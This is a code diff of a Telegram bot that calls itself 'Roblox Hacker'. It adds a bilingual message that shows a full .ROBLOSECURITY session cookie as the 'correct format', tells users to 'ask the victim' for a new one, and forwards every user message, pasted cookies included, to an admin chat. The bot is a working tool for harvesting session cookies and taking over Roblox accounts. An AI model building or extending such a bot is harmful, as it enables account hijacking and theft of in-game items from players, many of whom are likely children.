@@ -79,6 +79,18 @@ TEXTS = {
             "15. Скопируйте весь текст 🍪\n"
             "16. Отправьте этот текст боту."
         ),
+        "cookie_example": (
+            "📋 *ПРИМЕР .ROBLOSECURITY КУКИ*\n\n"
+            "─────────────────────\n"
+            "✅ *Правильный формат:*\n\n"
+            "`_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaBBAEGAEiGwoEZHVpZBITNTI3Njk2MjY5NDU4ODEyNzM4MygD.CoXGtP4IrzR_iP4dEHektFGxF9LCUYRu50Z1ntJAgl5gBnyvxO_xU3bNljIoMD1TXaYkmtMapOqf8245q-cDzc0rQ_joqO4GaO2c_fjkhu9E-I4Ir31_84vIsU7Y-XIWV2I1o_oHFBWhG7pIJ67uJgwly2Bm5wiYs83vudu3MOMc_I_388mT4ilDG8zdQgD4XuvQ2852eR33rMW4TH3OcYMZ6Nt-9vKQDSArT87mVapgDxwQV8vYHuejCdyVhjRuDr647jiC0dy2IIOWp_d5y0VY-ZNNmPtZalpI1jx6aYLHDBXEXawma38yZzrMrTL0QDFQlNRodapz5cEIbPMnuENjWrsbMbS8yNIyZtw7QHh2l5YTTUUuqUgSCZ-xZTfYtQoy0-zbTTIpknQi1Z-hf0tClV2BW4rmWQtFKqNhASfzcq8K1QY_Gr3Lb6SlwBF4KwXJhxvmVmR6ZL4l33nDm5wznHVPf3MmjLYXeIOIrw7LFevW_cjy0RT3NPIWEy5ufnLMI2ojA9ZeAt7UyZALCVI3sDYuTngR4qntCl2dgcmbpeTmYTm0ZAUrxek311swc1LSdG-3bTlpuX5DDleKdK344tIWYqwQ64SMa6uT8gQ_S9HeruW3bc_LwaJGyiO6BSNcFR818C92cofjFgoHXKHunbXUqvmMqpyOYMPUM1lQuIzfUOGKGaZKLALf_50LRnvNeIwTaCwcSvRrXDJ0UQt2Tvh9Xt8DOo82ohGpOFqfSc7QmO4Y2h7vj02JTg7D215qP6bFJhF0Enr2J_Qc7yU0g7m-mAVcZYy_tlr8G8.FHPbCuhmCc3SmaHqEmSRyteaEEU`\n\n"
+            "─────────────────────\n"
+            "⚠️ *ВАЖНО:*\n"
+            "▸ Кука должна начинаться с `_|WARNING`\n"
+            "▸ Копируйте ВЕСЬ текст от начала до конца\n"
+            "▸ Не добавляйте лишних пробелов или символов\n"
+            "▸ Если кука не подходит — попросите жертву сгенерировать новую"
+        ),
         "support": "📩 *Напишите ваш запрос. Администратор ответит в ближайшее время.*",
         "choose_lang": "🌐 *Выберите язык:*",
         "lang_changed": "✅ *Язык изменён.*",
@@ -123,6 +135,18 @@ TEXTS = {
             "15. Copy the entire text 🍪\n"
             "16. Send this text to the bot."
         ),
+        "cookie_example": (
+            "📋 *EXAMPLE .ROBLOSECURITY COOKIE*\n\n"
+            "─────────────────────\n"
+            "✅ *Correct format:*\n\n"
+            "`_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaBBAEGAEiGwoEZHVpZBITNTI3Njk2MjY5NDU4ODEyNzM4MygD.CoXGtP4IrzR_iP4dEHektFGxF9LCUYRu50Z1ntJAgl5gBnyvxO_xU3bNljIoMD1TXaYkmtMapOqf8245q-cDzc0rQ_joqO4GaO2c_fjkhu9E-I4Ir31_84vIsU7Y-XIWV2I1o_oHFBWhG7pIJ67uJgwly2Bm5wiYs83vudu3MOMc_I_388mT4ilDG8zdQgD4XuvQ2852eR33rMW4TH3OcYMZ6Nt-9vKQDSArT87mVapgDxwQV8vYHuejCdyVhjRuDr647jiC0dy2IIOWp_d5y0VY-ZNNmPtZalpI1jx6aYLHDBXEXawma38yZzrMrTL0QDFQlNRodapz5cEIbPMnuENjWrsbMbS8yNIyZtw7QHh2l5YTTUUuqUgSCZ-xZTfYtQoy0-zbTTIpknQi1Z-hf0tClV2BW4rmWQtFKqNhASfzcq8K1QY_Gr3Lb6SlwBF4KwXJhxvmVmR6ZL4l33nDm5wznHVPf3MmjLYXeIOIrw7LFevW_cjy0RT3NPIWEy5ufnLMI2ojA9ZeAt7UyZALCVI3sDYuTngR4qntCl2dgcmbpeTmYTm0ZAUrxek311swc1LSdG-3bTlpuX5DDleKdK344tIWYqwQ64SMa6uT8gQ_S9HeruW3bc_LwaJGyiO6BSNcFR818C92cofjFgoHXKHunbXUqvmMqpyOYMPUM1lQuIzfUOGKGaZKLALf_50LRnvNeIwTaCwcSvRrXDJ0UQt2Tvh9Xt8DOo82ohGpOFqfSc7QmO4Y2h7vj02JTg7D215qP6bFJhF0Enr2J_Qc7yU0g7m-mAVcZYy_tlr8G8.FHPbCuhmCc3SmaHqEmSRyteaEEU`\n\n"
+            "─────────────────────\n"
+            "⚠️ *IMPORTANT:*\n"
+            "▸ Cookie must start with `_|WARNING`\n"
+            "▸ Copy the ENTIRE text from start to end\n"
+            "▸ Don't add extra spaces or characters\n"
+            "▸ If cookie doesn't work — ask the victim to generate a new one"
+        ),
         "support": "📩 *Write your request. Admin will reply soon.*",
         "choose_lang": "🌐 *Choose language:*",
         "lang_changed": "✅ *Language changed.*",
@@ -145,8 +169,8 @@ LANG_KEYBOARD = {
 MAIN_KEYBOARD_RU = {
     "keyboard": [
         ["🎥 Видео-урок", "🎯 Взломать аккаунт"],
-        ["🍪 Как получить куки", "📩 Написать поддержку"],
-        ["🌐 Сменить язык"]
+        ["🍪 Как получить куки", "📋 Пример куки"],
+        ["📩 Написать поддержку", "🌐 Сменить язык"]
     ],
     "resize_keyboard": True,
     "one_time_keyboard": False
@@ -155,8 +179,8 @@ MAIN_KEYBOARD_RU = {
 MAIN_KEYBOARD_EN = {
     "keyboard": [
         ["🎥 Video tutorial", "🎯 Hack account"],
-        ["🍪 How to get cookies", "📩 Write to support"],
-        ["🌐 Change language"]
+        ["🍪 How to get cookies", "📋 Cookie example"],
+        ["📩 Write to support", "🌐 Change language"]
     ],
     "resize_keyboard": True,
     "one_time_keyboard": False
@@ -181,9 +205,10 @@ def webhook():
             reply_to = data['message'].get('reply_to_message')
             if reply_to:
                 reply_text = reply_to.get('text', '')
-                match = re.search(r'ID:\s*(\d+)', reply_text)
-                if match:
-                    target_id = int(match.group(1))
+                # Ищем ID в формате @username (в первом сообщении)
+                # или просто используем последнего пользователя
+                if pending_reply.get("user_id"):
+                    target_id = pending_reply["user_id"]
                     target_lang = user_lang.get(str(target_id), "ru")
                     requests.post(
                         f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
@@ -197,80 +222,58 @@ def webhook():
                         f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                         json={
                             "chat_id": ADMIN_CHAT_ID,
+                            "text": f"✅ *Ответ отправлен* @{pending_reply.get('username', 'anon')}",
+                            "parse_mode": "Markdown"
+                        }
+                    )
+                    pending_reply = {}
+                    return "ok", 200
+                else:
+                    requests.post(
+                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                        json={
+                            "chat_id": ADMIN_CHAT_ID,
+                            "text": "⚠️ *Не удалось найти пользователя для ответа.*",
+                            "parse_mode": "Markdown"
+                        }
+                    )
+                    return "ok", 200
+
+            if text.startswith("/reply "):
+                parts = text.split(" ", 2)
+                if len(parts) >= 3 and parts[1].isdigit():
+                    target_id = int(parts[1])
+                    reply_text = parts[2]
+                    target_lang = user_lang.get(str(target_id), "ru")
+                    requests.post(
+                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                        json={
+                            "chat_id": target_id,
+                            "text": TEXTS[target_lang]["admin_reply"] + reply_text,
+                            "parse_mode": "Markdown"
+                        }
+                    )
+                    requests.post(
+                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                        json={
+                            "chat_id": ADMIN_CHAT_ID,
                             "text": f"✅ *Ответ отправлен* (ID: {target_id})",
                             "parse_mode": "Markdown"
                         }
                     )
                     return "ok", 200
                 else:
-                    if text.startswith("/reply "):
-                        parts = text.split(" ", 2)
-                        if len(parts) >= 3 and parts[1].isdigit():
-                            target_id = int(parts[1])
-                            reply_text = parts[2]
-                            target_lang = user_lang.get(str(target_id), "ru")
-                            requests.post(
-                                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                                json={
-                                    "chat_id": target_id,
-                                    "text": TEXTS[target_lang]["admin_reply"] + reply_text,
-                                    "parse_mode": "Markdown"
-                                }
-                            )
-                            requests.post(
-                                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                                json={
-                                    "chat_id": ADMIN_CHAT_ID,
-                                    "text": f"✅ *Ответ отправлен* (ID: {target_id})",
-                                    "parse_mode": "Markdown"
-                                }
-                            )
-                            return "ok", 200
                     requests.post(
                         f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                         json={
                             "chat_id": ADMIN_CHAT_ID,
-                            "text": "⚠️ *Не удалось найти ID. Зажми сообщение с ID → Ответить*",
+                            "text": "⚠️ *Используй:* `/reply ID Текст`",
                             "parse_mode": "Markdown"
                         }
                     )
                     return "ok", 200
 
             if text and not text.startswith("/"):
-                if text.startswith("/reply "):
-                    parts = text.split(" ", 2)
-                    if len(parts) >= 3 and parts[1].isdigit():
-                        target_id = int(parts[1])
-                        reply_text = parts[2]
-                        target_lang = user_lang.get(str(target_id), "ru")
-                        requests.post(
-                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                            json={
-                                "chat_id": target_id,
-                                "text": TEXTS[target_lang]["admin_reply"] + reply_text,
-                                "parse_mode": "Markdown"
-                            }
-                        )
-                        requests.post(
-                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                            json={
-                                "chat_id": ADMIN_CHAT_ID,
-                                "text": f"✅ *Ответ отправлен* (ID: {target_id})",
-                                "parse_mode": "Markdown"
-                            }
-                        )
-                        return "ok", 200
-                    else:
-                        requests.post(
-                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                            json={
-                                "chat_id": ADMIN_CHAT_ID,
-                                "text": "⚠️ *Используй:* `/reply ID Текст`",
-                                "parse_mode": "Markdown"
-                            }
-                        )
-                        return "ok", 200
-                
                 requests.post(
                     f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                     json={
@@ -286,7 +289,7 @@ def webhook():
                     f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                     json={
                         "chat_id": ADMIN_CHAT_ID,
-                        "text": "👋 *Привет, админ!*\n\n▸ Бот Roblox Hacker работает\n▸ Зажми сообщение с ID → Ответить\n▸ Используй /help для списка команд",
+                        "text": "👋 *Привет, админ!*\n\n▸ Бот Roblox Hacker работает\n▸ Зажми сообщение → Ответить\n▸ Используй /help для списка команд",
                         "parse_mode": "Markdown",
                         "reply_markup": MAIN_KEYBOARD_RU
                     }
@@ -300,7 +303,7 @@ def webhook():
                     "/users — количество пользователей\n"
                     "/reply ID Текст — ответить пользователю\n"
                     "/sendall Текст — рассылка\n\n"
-                    "📌 *Зажми сообщение с ID → Ответить*\n"
+                    "📌 *Зажми сообщение → Ответить*\n"
                     "📌 *Просто текст без ответа — НЕ отправляется*"
                 )
                 requests.post(
@@ -399,13 +402,26 @@ def webhook():
             )
             return "ok", 200
 
-        # === ПЕРЕСЫЛКА СООБЩЕНИЯ АДМИНУ ===
-        admin_msg = f"ID: {user_id}\n{text}"
+        # === ОТПРАВКА АДМИНУ (два сообщения: юзернейм и текст) ===
+        # Сохраняем последнего пользователя для ответа
+        pending_reply = {"user_id": user_id, "username": username}
+
+        # 1. Юзернейм
         requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
             json={
                 "chat_id": ADMIN_CHAT_ID,
-                "text": admin_msg,
+                "text": f"@{username}",
+                "parse_mode": "Markdown"
+            }
+        )
+
+        # 2. Текст
+        requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={
+                "chat_id": ADMIN_CHAT_ID,
+                "text": text,
                 "parse_mode": "Markdown"
             }
         )
@@ -461,6 +477,17 @@ def webhook():
                 json={
                     "chat_id": chat_id,
                     "text": t["cookies_tutorial"],
+                    "parse_mode": "Markdown",
+                    "reply_markup": keyboard
+                }
+            )
+
+        elif text in ["📋 Пример куки", "📋 Cookie example"]:
+            requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                json={
+                    "chat_id": chat_id,
+                    "text": t["cookie_example"],
                     "parse_mode": "Markdown",
                     "reply_markup": keyboard
                 }
